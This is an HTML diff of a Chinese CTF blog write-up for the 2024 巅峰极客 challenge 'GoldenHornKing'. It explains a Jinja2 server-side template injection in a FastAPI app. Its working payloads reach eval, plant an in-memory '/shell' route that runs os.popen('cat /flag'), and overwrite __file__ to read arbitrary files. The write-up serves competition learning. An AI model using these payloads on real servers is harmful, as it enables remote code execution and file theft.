@@ -1,333 +1,317 @@
-<!--
-	作者：Sariay
-	时间：2018-08-26
-	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
--->
+
+
 <!DOCTYPE html>
-<html class="html-loading">
-		
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
 
 <head>
-	<meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
-  <title>
-    
-      2024第七届巅峰极客部分wp | Infernity&#39;s Blog
-    
-  </title>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/I.png">
+  <link rel="icon" href="/img/I.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
   <meta name="author" content="Infernity">
-  <meta name="keywords" content="" />
-  <meta name="description" content="blog" />
-	<!-- favicon -->
-  <link rel="shortcut icon" href="/img/I.png">
-
-  <!-- css -->
+  <meta name="keywords" content="">
   
-<link rel="stylesheet" href="/css/Annie.css">
-
+    <meta name="description" content="GoldenHornKing源码给了是很明显的ssti，在&#x2F;calc路由里传参calc_req，黑名单是不能有：数字、百分号、非ascii之外的字符。最烦的是这个access，原本是False，可以不用管，但是一旦成功执行一次代码，access就会变成True，这个环境就不能打了，所以我们最好还是在本地先去掉这个access，方便我们调试，先打通一遍，再打开环境尝试。 123456789">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024第七届巅峰极客部分wp">
+<meta property="og:url" content="http://example.com/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/index.html">
+<meta property="og:site_name" content="Infernity&#39;s Blog">
+<meta property="og:description" content="GoldenHornKing源码给了是很明显的ssti，在&#x2F;calc路由里传参calc_req，黑名单是不能有：数字、百分号、非ascii之外的字符。最烦的是这个access，原本是False，可以不用管，但是一旦成功执行一次代码，access就会变成True，这个环境就不能打了，所以我们最好还是在本地先去掉这个access，方便我们调试，先打通一遍，再打开环境尝试。 123456789">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/dfjk/dfjk.png">
+<meta property="article:published_time" content="2024-08-25T02:03:00.000Z">
+<meta property="article:modified_time" content="2025-01-20T02:34:44.823Z">
+<meta property="article:author" content="Infernity">
+<meta property="article:tag" content="WPs">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/dfjk/dfjk.png">
   
-  <!-- jquery -->
-	
-<script src="/plugin/jquery/jquery.min.js"></script>
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>2024第七届巅峰极客部分wp - Infernity&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
-<script>
-    const CONFIG_BGIMAGE = {
-      mode: 'random_you',
-      normalSrc: '/img/header-bg.jpg',
-      randomYouMax: 59,
-      randomYouSrc: '/img/background/',
-	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
-	  preloaderEnable: true
-    }
-	
-    const CONFIG_LEACLOUD_COUNT = {
-      enable: true,
-	  appId: 'AU8',
-	  appKey: '4cU',
-	  serverURLs: 'http' || ' '
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":150,"cursorChar":"_","loop":true,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
 <meta name="generator" content="Hexo 6.3.0"></head>
-	<body>
-		<!-- Preloader -->
-
-	<div id="preloader">
-		<div class="pre-container">
-			
-				<div class="spinner">
-					<div class="double-bounce1"></div>
-					<div class="double-bounce2"></div>
-				</div>
-						
-		</div>
-	</div>
 
 
-<!-- header -->
-<header class="fixbackground bg-pan-br">
-	<div class="mask">
-		<!-- motto -->
-		<div class="h-body">	
-			
-				<div class="motto text-shadow-pop-left">
-					<p class="content" id="motto-content">获取中...</p>
-					<p>-<p>
-					<p class="author" id="motto-author">Just a minute...</p>
-				</div>
-			
-		</div>
-		
-		<!-- others: such as time... -->			
-		<div class="h-footer">
-			<a href="javascript:;" id="read-more" class="scroll-down">
-				<span class="icon-anchor1 animation-scroll-down"></span>
-			</a>
-		</div>
-	</div>
-</header>
+<body>
+  
 
-<div id="navigation-hide">
-	<!-- Progress bar -->
-	<div id="progress-bar"></div>
-
-	<!-- Progress percent -->
-	<div id="progress-percentage"><span>0.0%</span></div>
-
-	<div class="toc-switch"><span class="switch-button">目录</span></div>
-
-	<!-- Page title -->
-	<p>
-		
-			「2024第七届巅峰极客部分wp」
-		
-	</p>
-
-	
-	
-		<span id="star-button" rel="unlike">
-			<i class="icon-heart"></i>
-		</span>
-	
-
-	<!-- Nav trigger for navigation-H-->
-	<a class="nav-trigger"><span></span></a>
-</div>
-
-<!-- Navigation in div(id="navigation-H") -->
-<nav class="nav-container" id="cd-nav">
-	<div class="nav-header">
-		<span class="logo"> 
-			<img src="/img/logo.png">
-		</span>
-		<a href="javascript:;" class="nav-close"></a>
-	</div>
-	
-	<div class="nav-body">
-		<ul id="global-nav">
-	
-		<li class="menu-home">
-			<a href="/" class="menu-item-home" target="_blank">主页</a>
-		</li>
-		
-	
-		<li class="menu-archive">
-			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
-		</li>
-		
-	
-		<li class="menu-categories">
-			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
-		</li>
-		
-	
-		<li class="menu-tags">
-			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
-		</li>
-		
-	
-		<li class="menu-Friends!">
-			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
-		</li>
-		
-	
-		<li class="menu-gallery">
-			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
-		</li>
-		
-	
-
-	
-</ul>
-	</div>
-	
-	<div class="nav-footer">
-		<ul id="global-social">
-	
-		<li>
-			<a href="http://github.com/" target="_blank">
-				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="/img/qq.png" target="_blank">
-				<span class="icon-qq"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="https://github.com/CyberPunk-Infernity" target="_blank">
-				<span class="icon-github"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="/img/weixin.jpg" target="_blank">
-				<span class="icon-weixin"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="https://blog.csdn.net/qq_39591427?spm=1000.2115.3001.5343" target="_blank">
-				<span class="icon-csdn"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="http://github.com/" target="_blank">
-				<span class="icon-instagram"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="http://github.com/" target="_blank">
-				<span class="icon-twitter"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="/atom.xml" target="_blank">
-				<span class="icon-rss"></span>
-			</a>
-		</li>
-			
-</ul>
-
-	</div>
-</nav>
-			
-		<!--main-->
-		<main>
-			<!--
-	时间：2018-11-17
-	描述：
-		插件名称：katelog.min.js
-		插件作者：KELEN
-		插件来源: https://github.com/KELEN/katelog
--->
-
-	
-		<div class="layout-toc">
-			<div id="layout-toc">
-				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
-			</div>
-		</div>
-
-		
-<script src="/plugin/toc/katelog.min.js"></script>
-
-
-		
-	 
-
-<div class="layout-post">
-	<div id="layout-post">
-		<div class="article-title">
-			
-	<a href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" itemprop="url">
-		2024第七届巅峰极客部分wp
-	</a>
-
-		</div>
-
-		<div class="article-meta">
-			<span>
-				<i class="icon-calendar1"></i>
-				
-				
-
-
-
-
-	更新于
-
-	<a href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" itemprop="url">
-		<time datetime="2024-08-25T02:03:00.000Z" itemprop="dateUpdated">
-	  		2024-08-27
-	  </time>
-	</a> 
-
-
-
-			</span>
-			<span>
-				
-	<i class="icon-price-tags"></i>
-	
-		<a href="/tags/WPs/" class=" ">
-			WPs
-		</a>
-	
-		
-			</span>
-			
-			
-
-	
-    <span class="leancloud_visitors" id="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/_visitors" data-url="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" data-title="2024第七届巅峰极客部分wp">
-       	<i class="icon-eye"></i>
-       	热度
-        
-            <i class="leancloud_visitors_count" id="leancloud_visitors_count">1</i>
-                   
-    </span>
+  <header>
     
 
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Infernity&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/friends/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>friends</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background/19.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">2024第七届巅峰极客部分wp</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-25 10:03" pubdate>
+          2024年8月25日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
 
 
-	
-    <span class="leancloud_likes" id="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/_likes" data-url="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" data-title="2024第七届巅峰极客部分wp" rel="unlike">
-        <i class="icon-heart"></i>
-        喜欢
-        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
-    </span>
-	
+        
+      </div>
 
-		</div>
+      
+    </div>
+  </div>
+</div>
 
-		<div class="article-content" id="article-content">
-			<h1 id="GoldenHornKing"><a href="#GoldenHornKing" class="headerlink" title="GoldenHornKing"></a>GoldenHornKing</h1><p>源码给了是很明显的ssti，在&#x2F;calc路由里传参calc_req，黑名单是不能有：<strong>数字、百分号、非ascii之外的字符</strong>。最烦的是这个access，原本是False，可以不用管，但是一旦成功执行一次代码，access就会变成True，这个环境就不能打了，所以我们最好还是在本地先去掉这个access，方便我们调试，先打通一遍，再打开环境尝试。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/calc&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@timeout_after(<span class="params"><span class="number">1</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">ssti</span>(<span class="params">calc_req: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">global</span> access</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">any</span>(char.isdigit() <span class="keyword">for</span> char <span class="keyword">in</span> calc_req)) <span class="keyword">or</span> (<span class="string">&quot;%&quot;</span> <span class="keyword">in</span> calc_req) <span class="keyword">or</span> <span class="keyword">not</span> calc_req.isascii() <span class="keyword">or</span> access:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;bad char&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        jinja2.Environment(loader=jinja2.BaseLoader()).from_string(<span class="string">f&quot;&#123;&#123;&#123;&#123; <span class="subst">&#123;calc_req&#125;</span> &#125;&#125;&#125;&#125;&quot;</span>).render(&#123;<span class="string">&quot;app&quot;</span>: app&#125;)</span><br><span class="line">        access = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;fight&quot;</span></span><br></pre></td></tr></table></figure>
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2024第七届巅峰极客部分wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="GoldenHornKing"><a href="#GoldenHornKing" class="headerlink" title="GoldenHornKing"></a>GoldenHornKing</h1><p>源码给了是很明显的ssti，在&#x2F;calc路由里传参calc_req，黑名单是不能有：<strong>数字、百分号、非ascii之外的字符</strong>。最烦的是这个access，原本是False，可以不用管，但是一旦成功执行一次代码，access就会变成True，这个环境就不能打了，所以我们最好还是在本地先去掉这个access，方便我们调试，先打通一遍，再打开环境尝试。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/calc&quot;</span></span>)</span><br><span class="hljs-meta">@timeout_after(<span class="hljs-params"><span class="hljs-number">1</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">ssti</span>(<span class="hljs-params">calc_req: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-keyword">global</span> access<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">any</span>(char.isdigit() <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> calc_req)) <span class="hljs-keyword">or</span> (<span class="hljs-string">&quot;%&quot;</span> <span class="hljs-keyword">in</span> calc_req) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> calc_req.isascii() <span class="hljs-keyword">or</span> access:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bad char&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        jinja2.Environment(loader=jinja2.BaseLoader()).from_string(<span class="hljs-string">f&quot;&#123;&#123;&#123;&#123; <span class="hljs-subst">&#123;calc_req&#125;</span> &#125;&#125;&#125;&#125;&quot;</span>).render(&#123;<span class="hljs-string">&quot;app&quot;</span>: app&#125;)<br>        access = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fight&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>这里calc_req参数外面给了四个大括号，这意味着我们传参不需要像ssti一样再传两对大括号进去了，直接可以打payload。</p>
 <p>这里是没给回显的，除非你有read()所以我们只能通过服务器是否爆500来判断我们的payload是否有问题。</p>
 <p>我们先拿eval：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]</span><br></pre></td></tr></table></figure>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__base__</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span><br></code></pre></td></tr></table></figure>
 
 <p>这里使用 <code>.__subclasses__()</code> 后面配合 <code>[]</code> 可能更多地是选择了系统中第一个有 <code>__init__</code>、<code>__globals__</code> 的子类，因此不会导致错误。</p>
 <p>这里还有一个拿eval的办法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.__init__.__globals__.__builtins__.eval(&quot;1*1&quot;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">app.<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span>.<span class="hljs-emphasis">__builtins__</span>.eval(&quot;1*1&quot;)<br></code></pre></td></tr></table></figure>
 
 <p>因为代码前面app &#x3D; FastAPI()，app是FastAPI的一个对象，我们就可以直接调用app也就是FastAPI类的方法了。</p>
 <p>拿到eval后，我们到现在这道题有两个做法：</p>
 <p><strong>方法一：打内存马进行rce</strong></p>
 <p>打FastAPI内存马，在FastAPI类有一个add_api_route方法，我们可以通过这个方法来增加一个路由，进行rce</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.add_api_route(<span class="string">&#x27;/shell&#x27;</span>, <span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read())</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">app.add_api_route(<span class="hljs-string">&#x27;/shell&#x27;</span>, <span class="hljs-keyword">lambda</span>: <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read())<br></code></pre></td></tr></table></figure>
 
 <p>我们需要再eval里重新获取一遍app也就是FastAPI的对象。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>]</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;__main__&#x27;</span>].__dict__[<span class="hljs-string">&#x27;app&#x27;</span>]<br></code></pre></td></tr></table></figure>
 
 <ol>
 <li><code>sys.modules</code>：<code>sys</code> 模块中有一个名为 <code>modules</code> 的字典，它维护了所有已导入模块的当前状态。这个字典的键是模块的名称，而值是对应的模块对象。</li>
@@ -336,742 +320,420 @@
 <li><code>[&#39;app&#39;]</code>：最后，从模块的 <code>__dict__</code> 中获取名为 <code>app</code> 的对象。</li>
 </ol>
 <p>然后整合以下payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].add_api_route(&#x27;/shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())&quot;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">app<span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.__builtins__</span><span class="hljs-selector-class">.eval</span>(&quot;__import__(&#x27;sys&#x27;)<span class="hljs-selector-class">.modules</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__main__&#x27;</span>]</span><span class="hljs-selector-class">.__dict__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;app&#x27;</span>]</span><span class="hljs-selector-class">.add_api_route</span>(&#x27;/shell&#x27;, lambda :__import__(&#x27;os&#x27;)<span class="hljs-selector-class">.popen</span>(&#x27;cat /flag&#x27;)<span class="hljs-selector-class">.read</span>())&quot;)<br></code></pre></td></tr></table></figure>
 
 <p>现在访问&#x2F;shell就可以拿到flag了</p>
 <p><strong>方法二：修改__file__进行任意文件读取</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@timeout_after(<span class="params"><span class="number">1</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-meta">@timeout_after(<span class="hljs-params"><span class="hljs-number">1</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<br></code></pre></td></tr></table></figure>
 
 <p>在跟路由读取了当前代码文件内容，并输出到网页上。那么如果我们能修改<code>__file__</code>为&#x2F;flag那么访问根路由就能拿到flag了。</p>
 <p><code>__file__</code>在全局变量globals里有</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>],<span class="string">&#x27;__file__&#x27;</span>,<span class="string">&#x27;/flag&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">setattr</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;__main__&#x27;</span>],<span class="hljs-string">&#x27;__file__&#x27;</span>,<span class="hljs-string">&#x27;/flag&#x27;</span>)<br></code></pre></td></tr></table></figure>
 
 <p>使用setattr(object, name, value)方法修改对象的属性值。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">object -- 对象。</span><br><span class="line">name -- 字符串，对象属性。</span><br><span class="line">value -- 属性值。</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">object</span> <span class="hljs-comment">-- 对象。</span><br><span class="hljs-type">name</span> <span class="hljs-comment">-- 字符串，对象属性。</span><br><span class="hljs-keyword">value</span> <span class="hljs-comment">-- 属性值。</span><br></code></pre></td></tr></table></figure>
 
 <blockquote>
 <p>Q：为什么不用<code>__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__</code>，<code>__file__</code>明明在这里面啊？</p>
 <p>A：因为setattr函数的第一个值是一个对象，<code>__dict__</code>是<code>__main__</code>的一个属性，并不是一个对象。</p>
 </blockquote>
 <p>整合一下payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.__init__.__globals__.__builtins__.eval(&quot;setattr(__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;],&#x27;__file__&#x27;,&#x27;/flag&#x27;)&quot;)</span><br></pre></td></tr></table></figure>
